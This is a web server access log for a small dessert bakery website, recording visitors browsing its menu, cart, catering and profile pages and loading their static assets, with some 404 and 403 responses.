142.179.59.145 - - [08/May/2024:03:48:16 +0000] "GET /cart/ HTTP/1.1" 200 998 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
207.81.58.39 - - [08/May/2024:03:48:22 +0000] "GET /profile/ HTTP/1.1" 200 1074 "https://deztinysdessertz.ca/catering/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:22 +0000] "GET /static/styles/profile_style.css HTTP/1.1" 200 757 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:22 +0000] "GET /static/layouts/profile_layout.css HTTP/1.1" 200 702 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:22 +0000] "GET /static/images/profile_images/dezyroo.png HTTP/1.1" 200 1041526 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:22 +0000] "GET /static/icons/profile_icons/logo-fb.png HTTP/1.1" 200 35518 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:22 +0000] "GET /static/icons/profile_icons/logo-ig.png HTTP/1.1" 200 170106 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:22 +0000] "GET /static/icons/profile_icons/logo-tiktok.png HTTP/1.1" 200 11484 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:22 +0000] "GET /static/images/profile_images/me.jpg HTTP/1.1" 200 17104 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:22 +0000] "GET /static/icons/profile_icons/logo-gmail.png HTTP/1.1" 200 9754 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:22 +0000] "GET /static/icons/profile_icons/logo-github.png HTTP/1.1" 200 15613 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:03:48:26 +0000] "GET /cart/ HTTP/1.1" 200 998 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
207.81.58.39 - - [08/May/2024:03:48:34 +0000] "GET / HTTP/1.1" 200 844 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:03:48:36 +0000] "GET /menu/ HTTP/1.1" 200 1603 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:48:37 +0000] "GET /catering/ HTTP/1.1" 200 1269 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
207.81.58.39 - - [08/May/2024:03:48:38 +0000] "GET /cart/ HTTP/1.1" 200 998 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:38 +0000] "GET /static/styles/cart_style.css HTTP/1.1" 200 1882 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:38 +0000] "GET /static/layouts/cart_layout.css HTTP/1.1" 200 548 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:38 +0000] "GET /static/scripts/cart.js HTTP/1.1" 200 5439 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:03:48:42 +0000] "GET /menu/ HTTP/1.1" 200 1603 "https://deztinysdessertz.ca/catering/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
207.81.58.39 - - [08/May/2024:03:48:44 +0000] "GET / HTTP/1.1" 200 844 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:03:48:48 +0000] "GET /cart/ HTTP/1.1" 200 998 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
207.81.58.39 - - [08/May/2024:03:48:48 +0000] "GET /menu.html HTTP/1.1" 404 159 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:52 +0000] "GET /menu.html HTTP/1.1" 404 159 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:03:48:59 +0000] "GET / HTTP/1.1" 200 844 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:49:00 +0000] "GET /menu.html HTTP/1.1" 404 159 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:49:08 +0000] "GET /menu/ HTTP/1.1" 200 1603 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:49:10 +0000] "GET / HTTP/1.1" 200 844 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:49:10 +0000] "GET /menu/ HTTP/1.1" 200 1606 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
207.81.58.39 - - [08/May/2024:03:49:14 +0000] "GET /menu/ HTTP/1.1" 200 1605 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:03:49:17 +0000] "GET /menu/ HTTP/1.1" 200 1605 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:49:28 +0000] "POST /add_to_cart/ HTTP/1.1" 403 570 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:49:30 +0000] "GET /cart/ HTTP/1.1" 200 998 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:49:34 +0000] "GET /menu/ HTTP/1.1" 200 1603 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
207.81.58.39 - - [08/May/2024:03:49:46 +0000] "GET / HTTP/1.1" 200 844 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:49:47 +0000] "GET /menu/ HTTP/1.1" 200 1603 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:49:48 +0000] "GET /catering/ HTTP/1.1" 200 1268 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:49:48 +0000] "GET /profile/ HTTP/1.1" 200 1074 "https://deztinysdessertz.ca/catering/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:49:50 +0000] "GET /catering/ HTTP/1.1" 200 1267 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:03:49:54 +0000] "GET /catering/ HTTP/1.1" 200 1268 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:50:20 +0000] "GET /catering/ HTTP/1.1" 200 1269 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
207.81.58.39 - - [08/May/2024:03:50:43 +0000] "GET /profile/ HTTP/1.1" 200 1074 "https://deztinysdessertz.ca/catering/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:03:51:04 +0000] "GET /profile/ HTTP/1.1" 200 1074 "https://deztinysdessertz.ca/catering/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:51:04 +0000] "GET /static/styles/profile_style.css HTTP/1.1" 200 757 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:51:04 +0000] "GET /static/layouts/profile_layout.css HTTP/1.1" 200 702 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:51:04 +0000] "GET /static/icons/profile_icons/logo-fb.png HTTP/1.1" 200 35518 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:51:04 +0000] "GET /static/images/profile_images/me.jpg HTTP/1.1" 200 17104 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:51:04 +0000] "GET /static/icons/profile_icons/logo-gmail.png HTTP/1.1" 200 9754 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:51:04 +0000] "GET /static/icons/profile_icons/logo-tiktok.png HTTP/1.1" 200 11484 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:51:04 +0000] "GET /static/icons/profile_icons/logo-github.png HTTP/1.1" 200 15613 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:51:04 +0000] "GET /static/icons/profile_icons/logo-ig.png HTTP/1.1" 200 170106 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:51:04 +0000] "GET /static/images/profile_images/dezyroo.png HTTP/1.1" 200 1041526 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
174.138.74.1 - - [08/May/2024:03:51:48 +0000] "GET / HTTP/1.1" 200 844 "http://209.38.130.13/" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
174.138.74.1 - - [08/May/2024:03:51:48 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "https://deztinysdessertz.ca/" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
142.179.59.145 - - [08/May/2024:03:52:25 +0000] "GET /menu/ HTTP/1.1" 200 1602 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:52:48 +0000] "GET /menu/ HTTP/1.1" 200 1605 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:58:55 +0000] "GET / HTTP/1.1" 200 844 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:58:56 +0000] "GET /profile/ HTTP/1.1" 200 1074 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:58:58 +0000] "GET / HTTP/1.1" 200 844 "https://deztinysdessertz.ca/profile/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:58:59 +0000] "GET /menu/ HTTP/1.1" 200 1602 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:59:03 +0000] "GET / HTTP/1.1" 200 844 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:59:04 +0000] "GET /menu/ HTTP/1.1" 200 1604 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:59:06 +0000] "GET / HTTP/1.1" 200 844 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:59:07 +0000] "GET /menu/ HTTP/1.1" 200 1602 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:59:08 +0000] "GET / HTTP/1.1" 200 844 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:59:09 +0000] "GET /menu/ HTTP/1.1" 200 1600 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
207.81.58.39 - - [08/May/2024:03:59:12 +0000] "GET / HTTP/1.1" 200 844 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:59:15 +0000] "GET /menu.html HTTP/1.1" 404 159 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:03:59:24 +0000] "GET / HTTP/1.1" 200 844 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
207.81.58.39 - - [08/May/2024:03:59:24 +0000] "GET /menu.html HTTP/1.1" 404 159 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:03:59:24 +0000] "GET /menu/ HTTP/1.1" 200 1605 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
207.81.58.39 - - [08/May/2024:03:59:25 +0000] "GET /menu.html HTTP/1.1" 404 159 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:03:59:49 +0000] "GET / HTTP/1.1" 200 844 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
207.81.58.39 - - [08/May/2024:04:00:08 +0000] "GET / HTTP/1.1" 200 844 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:04:00:09 +0000] "GET /menu/ HTTP/1.1" 200 1604 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:04:00:09 +0000] "GET /static/styles/menu_style.css HTTP/1.1" 200 1602 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:04:00:10 +0000] "GET /static/layouts/menu_layout.css HTTP/1.1" 200 497 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:04:00:10 +0000] "GET /static/scripts/menu.js HTTP/1.1" 200 13986 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:04:00:10 +0000] "GET /static/images/menu_images/cake1.jpg HTTP/1.1" 200 169204 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:04:00:10 +0000] "GET /static/images/menu_images/cupcakes.jpg HTTP/1.1" 200 171691 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:04:00:10 +0000] "GET /static/images/menu_images/dippeddessert.jpg HTTP/1.1" 200 194320 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:04:00:10 +0000] "GET /static/images/menu_images/otherdessert.jpg HTTP/1.1" 200 254000 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:04:00:10 +0000] "GET /static/icons/home_icons/question_icon.png HTTP/1.1" 200 53751 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
207.81.58.39 - - [08/May/2024:04:00:10 +0000] "GET /menu.html HTTP/1.1" 404 159 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:04:00:12 +0000] "GET /menu/ HTTP/1.1" 200 1605 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:04:00:13 +0000] "GET /menu/ HTTP/1.1" 200 1603 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
207.81.58.39 - - [08/May/2024:04:00:15 +0000] "GET /menu.html HTTP/1.1" 404 159 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:04:00:16 +0000] "GET / HTTP/1.1" 200 844 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:04:00:16 +0000] "GET /menu/ HTTP/1.1" 200 1606 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:04:01:57 +0000] "GET / HTTP/1.1" 200 844 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:02:00 +0000] "GET /menu/ HTTP/1.1" 200 1602 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:02:14 +0000] "POST /add_to_cart/ HTTP/1.1" 403 570 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:02:16 +0000] "GET /cart/ HTTP/1.1" 200 998 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:02:16 +0000] "GET /static/styles/cart_style.css HTTP/1.1" 200 1882 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:02:16 +0000] "GET /static/layouts/cart_layout.css HTTP/1.1" 200 548 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:02:16 +0000] "GET /static/scripts/cart.js HTTP/1.1" 200 5439 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:07:34 +0000] "GET / HTTP/1.1" 200 844 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:07:34 +0000] "GET /static/fonts/Lemonada/static/Lemonada-Medium.ttf HTTP/1.1" 200 91648 "https://www.deztinysdessertz.ca/static/fonts/font.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:07:37 +0000] "GET /menu.html HTTP/1.1" 404 159 "https://www.deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
